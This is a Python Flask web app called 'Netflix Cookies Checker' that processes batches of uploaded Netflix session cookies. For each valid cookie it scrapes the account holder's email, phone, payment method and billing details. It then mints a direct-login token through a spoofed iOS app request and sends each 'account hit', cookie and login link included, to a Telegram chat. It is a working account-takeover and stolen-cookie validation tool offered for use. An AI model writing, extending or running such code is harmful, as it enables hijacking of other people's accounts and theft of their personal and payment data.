from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import os
import re
import json
import time
import requests
import zipfile
import urllib.parse
import codecs
import logging
import tempfile
import shutil
from datetime import datetime
import uuid

app = Flask(__name__)
CORS(app)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Owner credit
OWNER_CREDIT = "Huy Vũ - https://beacons.ai/huyvu2512"

# Telegram configuration (will be set by user)
TELEGRAM_CONFIG = {
    'enabled': False,
    'bot_token': '',
    'chat_id': ''
}

def unescape_plan(s):
    try:
        return codecs.decode(s, 'unicode_escape')
    except Exception:
        return s

def extract_netflix_id(content):
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                if cookie.get("name") == "NetflixId":
                    return cookie.get("value")
        elif isinstance(data, dict):
            if "NetflixId" in data:
                return data["NetflixId"]
            elif "cookies" in data:
                for cookie in data["cookies"]:
                    if cookie.get("name") == "NetflixId":
                        return cookie.get("value")
    except:
        pass
    
    netflix_id_match = re.search(r'(?<!\w)NetflixId=([^;,\s]+)', content)
    
    if netflix_id_match:
        netflix_id = netflix_id_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    netscape_match = re.search(r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', content)
    if netscape_match:
        netflix_id = netscape_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    plain_match = re.search(r'NetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
    if plain_match:
        netflix_id = plain_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    return None

def extract_profiles_from_manage_profiles(response_text):
    profiles = []
    
    try:      
        profiles_match = re.search(r'"profiles"\s*:\s*({[^}]+})', response_text)
        if profiles_match:
            profiles_json_str = profiles_match.group(1)                       
            def unescape_hex(match):
                hex_code = match.group(1)
                try:
                    return chr(int(hex_code, 16))
                except:
                    return match.group(0)
            cleaned_json = re.sub(r'\\x([0-9a-fA-F]{2})', unescape_hex, profiles_json_str)
            
            profiles_data = json.loads(f'{{{cleaned_json}}}')
            
            for profile_id, profile_data in profiles_data.items():
                if isinstance(profile_data, dict):
                    summary = profile_data.get('summary', {})
                    if isinstance(summary, dict):
                        value = summary.get('value', {})
                        if isinstance(value, dict):
                            profile_name = value.get('profileName')
                            if profile_name:
                                profiles.append(profile_name)
    
    except json.JSONDecodeError:
        try:
            profile_matches = re.findall(r'"profileName"\s*:\s*"([^"]+)"', response_text)
            for profile in profile_matches:
                profile = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), profile)
                profiles.append(profile)
        except:
            pass
    
    return profiles

def extract_next_billing_date(response_text):
    """Extract next billing date from GraphQL response"""
    try:
        # Look for nextBillingDate in the response
        billing_match = re.search(r'"nextBillingDate":\s*\{[^}]+\}', response_text)
        if billing_match:
            billing_data = billing_match.group(0)
            date_match = re.search(r'"date":\s*"([^"]+)"', billing_data)
            if date_match:
                return date_match.group(1)
        
        # Alternative pattern
        date_match = re.search(r'"nextBillingDate"[^}]+"date":\s*"([^"]+)"', response_text)
        if date_match:
            return date_match.group(1)
            
    except Exception as e:
        logger.error(f"Error extracting billing date: {e}")
    
    return "Unknown"

def check_netflix_cookie(cookie_dict):
    session = requests.Session()
    session.cookies.update(cookie_dict)
    url = 'https://www.netflix.com/YourAccount'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    try:
        resp = session.get(url, headers=headers, timeout=30)
        txt = resp.text
        
        logger.info(f"Response status: {resp.status_code}")
        
        
        if any(phrase in txt.lower() for phrase in ['"mode":"login"']):
            return {'ok': False, 'err': 'Invalid cookie (login page detected)', 'cookie': cookie_dict}
        
        if '"mode":"yourAccount"' not in txt:
            return {'ok': False, 'err': 'Invalid cookie (not logged in)', 'cookie': cookie_dict}

        def find(pattern, text=txt):
            m = re.search(pattern, text)
            return m.group(1).strip() if m else None

        # Extract plan information
        plan = find(r'"planName"\s*:\s*"([^"]+)"') or find(r'localizedPlanName[^}]+"value":"([^"]+)"')
        if plan:
            plan = unescape_plan(plan)
        else:
            plan = "Unknown"

        # Extract plan price
        plan_price = find(r'"planPrice"[^}]+"value":"([^"]+)"') or find(r'planPrice[^}]+value[^}]+"([^"]+)"')
        if plan_price:
            plan_price = unescape_plan(plan_price)
        else:
            plan_price = "Unknown"

        # Extract member since
        member_since = find(r'"memberSince":"([^"]+)"')
        if member_since:
            member_since = unescape_plan(member_since)
        else:
            member_since = "Unknown"

        # Extract payment method
        payment_method = find(r'"paymentMethod"[^}]+"value":"([^"]+)"')
        if not payment_method:
            payment_method = "Unknown"

        # Extract phone number
        phone = find(r'"phoneNumberDigits"[^}]+"value":"([^"]+)"')
        if phone:
            phone = phone.replace("\\x2B", "+")
        else:
            phone = "Unknown"

        # Extract phone verification status
        phone_verified_match = re.search(r'"growthPhoneNumber"[^}]+"isVerified":(true|false)', txt)
        phone_verified = "Yes" if phone_verified_match and phone_verified_match.group(1) == 'true' else "No"

        # Extract video quality
        video_quality = find(r'"videoQuality"[^}]+"value":"([^"]+)"')
        if not video_quality:
            video_quality = "Unknown"

        # Extract max streams
        max_streams = find(r'"maxStreams"[^}]+"value":(\d+)')
        if not max_streams:
            max_streams = "Unknown"

        # Extract payment hold status
        payment_hold_match = re.search(r'"growthHoldMetadata"[^}]+"isUserOnHold":(true|false)', txt)
        payment_hold = "Yes" if payment_hold_match and payment_hold_match.group(1) == 'true' else "No"

        # Extract extra member status
        extra_member_match = re.search(r'"showExtraMemberSection"[^}]+"value":(true|false)', txt)
        extra_member = "Yes" if extra_member_match and extra_member_match.group(1) == 'true' else "No"

        # Extract email verification status
        email_verified = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
        
        # Extract country
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
        
        # Extract email
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
        if email and email != "Unknown":
            email = urllib.parse.unquote(email)
        
        # Extract next billing date
        next_billing = extract_next_billing_date(txt)

        # Extract profiles
        profiles = []
        try:
            profile_matches = re.findall(r'"profileName"\s*:\s*"([^"]+)"', txt)
            for profile in profile_matches:
                if profile and profile not in profiles:
                    profiles.append(profile)
        except Exception as e:
            logger.error(f"Error extracting profiles: {e}")
        
        profiles_str = ", ".join(profiles) if profiles else "Unknown"

        # Check account status
        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_premium = bool(status_match and status_match.group(1) == 'CURRENT_MEMBER')
        is_valid = bool(status_match)
        
        # Additional validation for account status
        if not is_valid and "NetflixId" in cookie_dict:
            is_valid = any(phrase in txt for phrase in ['Account & Billing', 'membershipStatus', 'planName'])
            is_premium = is_valid

        logger.info(f"Account validation - Valid: {is_valid}, Premium: {is_premium}")

        return {
            'ok': is_valid,
            'premium': is_premium,
            'country': country,
            'plan': plan,
            'plan_price': plan_price,
            'member_since': member_since,
            'payment_method': payment_method,
            'phone': phone,
            'phone_verified': phone_verified,
            'video_quality': video_quality,
            'max_streams': max_streams,
            'on_payment_hold': payment_hold,
            'extra_member': extra_member,
            'email_verified': email_verified,
            'email': email,
            'profiles': profiles_str,
            'next_billing': next_billing,
            'cookie': cookie_dict
        }
    except Exception as e:
        logger.error(f"Error checking Netflix cookie: {str(e)}")
        return {'ok': False, 'err': str(e), 'cookie': cookie_dict}

def generate_token(netflix_id):
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    
    params = {
        'appVersion': "15.48.1",
        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        'device_type': "NFAPPL-02-",
        'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'idiom': "phone",
        'iosVersion': "15.8.5",
        'isTablet': "false",
        'languages': "en-US",
        'locale': "en-US",
        'maxDeviceWidth': "375",
        'model': "saget",
        'modelType': "IPHONE8-1",
        'odpAware': "true",
        'path': '["account","token","default"]',
        'pathFormat': "graph",
        'pixelDensity': "2.0",
        'progressive': "false",
        'responseFormat': "json"
    }

    headers = {
        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        'x-netflix.request.attempt': "1",
        'x-netflix.request.client.user.guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.context.profile-guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': "15.48.1",
        'x-netflix.argo.translated': "true",
        'x-netflix.context.form-factor': "phone",
        'x-netflix.context.sdk-version': "2012.4",
        'x-netflix.client.appversion': "15.48.1",
        'x-netflix.context.max-device-width': "375",
        'x-netflix.context.ab-tests': "",
        'x-netflix.tracing.cl.useractionid': "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        'x-netflix.client.type': "argo",
        'x-netflix.client.ftl.esn': "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'x-netflix.context.locales': "en-US",
        'x-netflix.context.top-level-uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.client.iosversion': "15.8.5",
        'accept-language': "en-US;q=1",
        'x-netflix.argo.abtests': "",
        'x-netflix.context.os-version': "15.8.5",
        'x-netflix.request.client.context': '{"appState":"foreground"}',
        'x-netflix.context.ui-flavor': "argo",
        'x-netflix.argo.nfnsm': "9",
        'x-netflix.context.pixel-density': "2.0",
        'x-netflix.request.toplevel.uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.request.client.timezoneid': "Asia/Dhaka",
        'Cookie': f"NetflixId={netflix_id}"
    }

    try:
        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
        data = response.json()
        
        if "value" in data and data["value"] and "account" in data["value"]:
            token_data = data["value"]["account"]["token"]["default"]
            token = token_data["token"]
            expires = token_data["expires"]
            
            if len(str(expires)) == 13:
                expires //= 1000
                
            generation_time = int(time.time())
            time_remaining = expires - generation_time
            
            return {
                "status": "Success",
                "generation_time": generation_time,
                "expires": expires,
                "time_remaining": time_remaining,
                "token": token,
                "direct_login_url": f"https://netflix.com/unsupported?nftoken={token}"
            }
        else:
            return {"status": "Failure", "error": "No token found in response"}
    except Exception as e:
        return {"status": "Error", "error": str(e)}

def extract_zip_and_get_files(zip_path, extract_dir):
    """Extract ZIP file and return list of .txt files"""
    txt_files = []
    
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        # Find all .txt files in the extracted directory
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        
        return txt_files
    except Exception as e:
        logger.error(f"Error extracting ZIP file: {e}")
        return []

def send_to_telegram(account_data, filename, original_content=""):
    """Send account information to Telegram with enhanced formatting"""
    if not TELEGRAM_CONFIG['enabled'] or not TELEGRAM_CONFIG['bot_token'] or not TELEGRAM_CONFIG['chat_id']:
        return False
    
    try:
        bot_token = TELEGRAM_CONFIG['bot_token']
        chat_id = TELEGRAM_CONFIG['chat_id']
        print(account_data)
        
        # Create enhanced formatted message
        message = "🎬 *NETFLIX ACCOUNT HIT* 🎬\n\n"
        
        message += "📋 *BASIC INFO*\n"
        message += "▫️ *File:* `{}`\n".format(filename.replace('_', '\_'))
        message += "▫️ *Time:* `{}`\n".format(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        message += "▫️ *Status:* `{}`\n".format("✅ VALID" if account_data['ok'] else "❌ INVALID")
        message += "▫️ *Premium:* `{}`\n\n".format("👑 YES" if account_data['premium'] else "❌ NO")
        
        message += "🌍 *ACCOUNT DETAILS*\n"
        message += "```\n"
        message += "Country:        {}\n".format(account_data['country'])
        message += "Plan:           {}\n".format(account_data['plan'])
        message += "Price:          {}\n".format(account_data['plan_price'])
        message += "Member Since:   {}\n".format(account_data['member_since'])
        message += "Payment Method: {}\n".format(account_data['payment_method'])
        message += "Billing Date:   {}\n".format(account_data['next_billing'])
        message += "```\n\n"
        
        message += "👤 *PROFILE INFORMATION*\n"
        message += "```\n"
        message += "Email:          {}\n".format(account_data['email'].replace('\\x40', '@'))
        message += "Email Verified: {}\n".format(account_data['email_verified'])
        message += "Phone:          {}\n".format(account_data['phone'])
        message += "Phone Verified: {}\n".format(account_data['phone_verified'])
        message += "Profiles:       {}\n".format(account_data['profiles'])
        message += "```\n\n"
        
        message += "⚙️ *ACCOUNT FEATURES*\n"
        message += "```\n"
        message += "Video Quality:  {}\n".format(account_data['video_quality'])
        message += "Max Streams:    {}\n".format(account_data['max_streams'])
        message += "Payment Hold:   {}\n".format(account_data['on_payment_hold'])
        message += "Extra Member:   {}\n".format(account_data['extra_member'])
        message += "```\n"
        nftdata = account_data['cookie']
        message += "🍪 *COOKIES*\n"
        message += "```\n"
        message += "NetflixId={}\n".format(nftdata['NetflixId'])
        message += "```\n"
        if account_data.get('token_result', {}).get('status') == 'Success':
            token = account_data['token_result']
            gen_time = datetime.fromtimestamp(token['generation_time']).strftime('%Y-%m-%d %H:%M:%S')
            exp_time = datetime.fromtimestamp(token['expires']).strftime('%Y-%m-%d %H:%M:%S')
            
            days = token['time_remaining'] // 86400
            hours = (token['time_remaining'] % 86400) // 3600
            minutes = (token['time_remaining'] % 3600) // 60
            seconds = token['time_remaining'] % 60
            
            message += "\n🔑 *TOKEN INFORMATION*\n"
            message += "```\n"
            message += "Status:         {}\n".format(token['status'])
            message += "Generation:     {}\n".format(gen_time)
            message += "Expiry:         {}\n".format(exp_time)
            message += "Time Remaining: {}d {}h {}m {}s\n".format(days, hours, minutes, seconds)
            message += "```\n\n"
            
            message += "🔗 *DIRECT LOGIN*\n"
            message += "`{}`\n\n".format(token['direct_login_url'])
            
            #message += "📎 *TOKEN*\n"
            #message += "`{}`\n".format(token['token'])
            
        message += "\n" + "━" * 35 + "\n"
        message += "🤖 *Generated by Netflix Cookies Checker*\n"
        message += "👤 *Owner:* `Huy Vũ - https://beacons.ai/huyvu2512`"

        # Create detailed file content
        file_content = "╔══════════════════════════════════════════╗\n"
        file_content += "║           NETFLIX ACCOUNT DETAILS         ║\n"
        file_content += "╚══════════════════════════════════════════╝\n\n"
        
        file_content += "📅 Generated: {}\n".format(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        file_content += "📁 Filename: {}\n\n".format(filename)
        
        file_content += "🔐 ACCOUNT STATUS\n"
        file_content += "├─ Status: {}\n".format("VALID" if account_data['ok'] else "INVALID")
        file_content += "├─ Premium: {}\n".format("YES" if account_data['premium'] else "NO")
        file_content += "└─ Country: {}\n\n".format(account_data['country'])
        
        file_content += "💳 SUBSCRIPTION DETAILS\n"
        file_content += "├─ Plan: {}\n".format(account_data['plan'])
        file_content += "├─ Price: {}\n".format(account_data['plan_price'])
        file_content += "├─ Member Since: {}\n".format(account_data['member_since'])
        file_content += "├─ Payment Method: {}\n".format(account_data['payment_method'])
        file_content += "└─ Next Billing: {}\n\n".format(account_data['next_billing'])
        
        file_content += "👤 PROFILE INFORMATION\n"
        file_content += "├─ Email: {}\n".format(account_data['email'].replace('\\x40', '@'))
        file_content += "├─ Email Verified: {}\n".format(account_data['email_verified'])
        file_content += "├─ Phone: {}\n".format(account_data['phone'])
        file_content += "├─ Phone Verified: {}\n".format(account_data['phone_verified'])
        file_content += "└─ Profiles: {}\n\n".format(account_data['profiles'])
        
        file_content += "⚙️ ACCOUNT FEATURES\n"
        file_content += "├─ Video Quality: {}\n".format(account_data['video_quality'])
        file_content += "├─ Max Streams: {}\n".format(account_data['max_streams'])
        file_content += "├─ Payment Hold: {}\n".format(account_data['on_payment_hold'])
        file_content += "└─ Extra Member: {}\n\n".format(account_data['extra_member'])
        
        file_content += "🍪 *COOKIES*\n"
        file_content += "NetflixId={}\n\n".format(nftdata['NetflixId'])
        
        
        if account_data.get('token_result', {}).get('status') == 'Success':
            token = account_data['token_result']
            file_content += "🔑 TOKEN INFORMATION\n"
            file_content += "├─ Status: {}\n".format(token['status'])
            file_content += "├─ Generation Time: {}\n".format(datetime.fromtimestamp(token['generation_time']).strftime('%Y-%m-%d %H:%M:%S'))
            file_content += "├─ Expiry: {}\n".format(datetime.fromtimestamp(token['expires']).strftime('%Y-%m-%d %H:%M:%S'))
            file_content += "├─ Time Remaining: {}d {}h {}m {}s\n".format(
                token['time_remaining'] // 86400,
                (token['time_remaining'] % 86400) // 3600,
                (token['time_remaining'] % 3600) // 60,
                token['time_remaining'] % 60
            )
            #file_content += "├─ Token: {}\n".format(token['token'])
            file_content += "└─ Login URL: {}\n\n".format(token['direct_login_url'])
        
        file_content += "━" * 45 + "\n"
        file_content += "Generated by Netflix Cookies Checker\n"
        file_content += "Owner: Huy Vũ - https://beacons.ai/huyvu2512\n"
        file_content += "━" * 45 + "\n"

        # Create temporary file
        temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8')
        temp_file.write(file_content)
        temp_file.flush()
        
        # Send message to Telegram
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'Markdown',
            'disable_web_page_preview': True
        }
        
        response = requests.post(url, data=payload, timeout=10, verify=False)
        
        if response.status_code == 200:
            # Send file
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            files = {
                'document': (f'netflix_{filename}_{int(time.time())}.txt', open(temp_file.name, 'rb'))
            }
            data = {
                'chat_id': chat_id,
                'caption': f'📄 Complete details for `{filename}`'
            }
            
            response = requests.post(url, files=files, data=data, timeout=10, verify=False)
            
            # Clean up temp file
            os.unlink(temp_file.name)
            
            if response.status_code == 200:
                logger.info(f"Successfully sent account info to Telegram for {filename}")
                return True
            else:
                logger.error(f"Failed to send file to Telegram: {response.text}")
                return False
        else:
            logger.error(f"Failed to send message to Telegram: {response.text}")
            # Clean up temp file
            os.unlink(temp_file.name)
            return False
            
    except Exception as e:
        logger.error(f"Error sending to Telegram: {str(e)}")
        # Clean up temp file if it exists
        try:
            if 'temp_file' in locals():
                os.unlink(temp_file.name)
        except:
            pass
        return False

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

@app.route('/api/telegram-config', methods=['POST'])
def set_telegram_config():
    try:
        data = request.get_json()
        TELEGRAM_CONFIG['enabled'] = data.get('enabled', False)
        TELEGRAM_CONFIG['bot_token'] = data.get('bot_token', '')
        TELEGRAM_CONFIG['chat_id'] = data.get('chat_id', '')
        
        logger.info(f"Telegram config updated: enabled={TELEGRAM_CONFIG['enabled']}")
        
        return jsonify({
            'status': 'success',
            'message': 'Telegram configuration updated',
            'config': TELEGRAM_CONFIG
        })
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Error updating Telegram config: {str(e)}'
        })

@app.route('/api/check', methods=['POST'])
def check_cookie():
    original_content = ""
    try:
        data = request.get_json()
        content = data.get('content', '')
        mode = data.get('mode', 'fullinfo')
        original_content = content
        
        if not content:
            return jsonify({'status': 'error', 'message': 'No content provided'})
        
        # Extract NetflixId
        netflix_id = extract_netflix_id(content)
        if not netflix_id:
            return jsonify({'status': 'error', 'message': 'No NetflixId found in the provided content'})
        
        # Check account validity
        account_info = check_netflix_cookie({"NetflixId": netflix_id})
        
        if mode == "tokenonly" or account_info["ok"]:
            token_result = generate_token(netflix_id)
            
            result = {
                "status": "success",
                "netflix_id": netflix_id,
                "account_info": account_info,
                "token_result": token_result,
                "mode": mode,
                "owner": OWNER_CREDIT
            }
            
            # Send to Telegram if enabled and account is valid
            if TELEGRAM_CONFIG['enabled'] and account_info["ok"]:
                telegram_sent = send_to_telegram({
                    **account_info,
                    'token_result': token_result
                }, "manual_input.txt", original_content)
                result['telegram_sent'] = telegram_sent
            
            return jsonify(result)
        else:
            return jsonify({
                "status": "error",
                "message": f"Invalid account: {account_info.get('err', 'Unknown error')}",
                "owner": OWNER_CREDIT
            })
            
    except Exception as e:
        return jsonify({
            "status": "error", 
            "message": f"Error processing content: {str(e)}",
            "owner": OWNER_CREDIT
        })

@app.route('/api/batch-check', methods=['POST'])
def batch_check():
    temp_dirs = []
    
    try:
        files = request.files.getlist('files')
        mode = request.form.get('mode', 'fullinfo')
        
        if not files:
            return jsonify({'status': 'error', 'message': 'No files provided', 'owner': OWNER_CREDIT})
        
        results = []
        
        for file in files:
            file_content = ""
            try:
                filename = file.filename
                
                if filename.lower().endswith('.zip'):
                    # Create unique temporary directory for this ZIP
                    unique_dir = tempfile.mkdtemp(prefix=f"netflix_batch_{uuid.uuid4().hex}_")
                    temp_dirs.append(unique_dir)
                    
                    # Save the uploaded ZIP file temporarily
                    zip_path = os.path.join(unique_dir, filename)
                    file.save(zip_path)
                    
                    # Extract and get all .txt files
                    txt_files = extract_zip_and_get_files(zip_path, unique_dir)
                    
                    for txt_file in txt_files:
                        try:
                            with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                            file_content = content
                            
                            # Extract NetflixId
                            netflix_id = extract_netflix_id(content)
                            
                            if netflix_id:
                                account_info = check_netflix_cookie({"NetflixId": netflix_id})
                                
                                if account_info["ok"]:
                                    token_result = generate_token(netflix_id)
                                    
                                    result_data = {
                                        "status": "success",
                                        "filename": os.path.basename(txt_file),
                                        "netflix_id": netflix_id,
                                        "account_info": account_info,
                                        "token_result": token_result,
                                        "mode": mode
                                    }
                                    
                                    # Send to Telegram if enabled
                                    if TELEGRAM_CONFIG['enabled']:
                                        telegram_sent = send_to_telegram({
                                            **account_info,
                                            'token_result': token_result
                                        }, os.path.basename(txt_file), file_content)
                                        result_data['telegram_sent'] = telegram_sent
                                    
                                    results.append(result_data)
                                else:
                                    results.append({
                                        "status": "error",
                                        "filename": os.path.basename(txt_file),
                                        "message": f"Invalid account: {account_info.get('err', 'Unknown error')}"
                                    })
                            else:
                                results.append({
                                    "status": "error",
                                    "filename": os.path.basename(txt_file),
                                    "message": "No NetflixId found"
                                })
                                
                        except Exception as e:
                            results.append({
                                "status": "error",
                                "filename": os.path.basename(txt_file),
                                "message": f"Error processing file: {str(e)}"
                            })
                
                elif filename.lower().endswith('.txt'):
                    # Handle individual text file
                    content = file.read().decode('utf-8', errors='ignore')
                    file_content = content
                    
                    # Extract NetflixId
                    netflix_id = extract_netflix_id(content)
                    
                    if netflix_id:
                        account_info = check_netflix_cookie({"NetflixId": netflix_id})
                        
                        if account_info["ok"]:
                            token_result = generate_token(netflix_id)
                            
                            result_data = {
                                "status": "success",
                                "filename": filename,
                                "netflix_id": netflix_id,
                                "account_info": account_info,
                                "token_result": token_result,
                                "mode": mode
                            }
                            
                            # Send to Telegram if enabled
                            if TELEGRAM_CONFIG['enabled']:
                                telegram_sent = send_to_telegram({
                                    **account_info,
                                    'token_result': token_result
                                }, filename, file_content)
                                result_data['telegram_sent'] = telegram_sent
                            
                            results.append(result_data)
                        else:
                            results.append({
                                "status": "error",
                                "filename": filename,
                                "message": f"Invalid account: {account_info.get('err', 'Unknown error')}"
                            })
                    else:
                        results.append({
                            "status": "error",
                            "filename": filename,
                            "message": "No NetflixId found"
                        })
                        
                else:
                    results.append({
                        "status": "error",
                        "filename": filename,
                        "message": "Unsupported file format. Only .txt and .zip files are supported."
                    })
                    
            except Exception as e:
                results.append({
                    "status": "error",
                    "filename": file.filename,
                    "message": f"Error processing file: {str(e)}"
                })
        
        return jsonify({
            "status": "success",
            "results": results,
            "owner": OWNER_CREDIT
        })
        
    except Exception as e:
        return jsonify({
            "status": "error", 
            "message": f"Error processing batch: {str(e)}",
            "owner": OWNER_CREDIT
        })
    
    finally:
        # Clean up all temporary directories
        for temp_dir in temp_dirs:
            try:
                shutil.rmtree(temp_dir)
                logger.info(f"Cleaned up temporary directory: {temp_dir}")
            except Exception as e:
                logger.error(f"Error cleaning up temporary directory {temp_dir}: {e}")

if __name__ == '__main__':

    app.run(debug=True, host='0.0.0.0', port=5000)

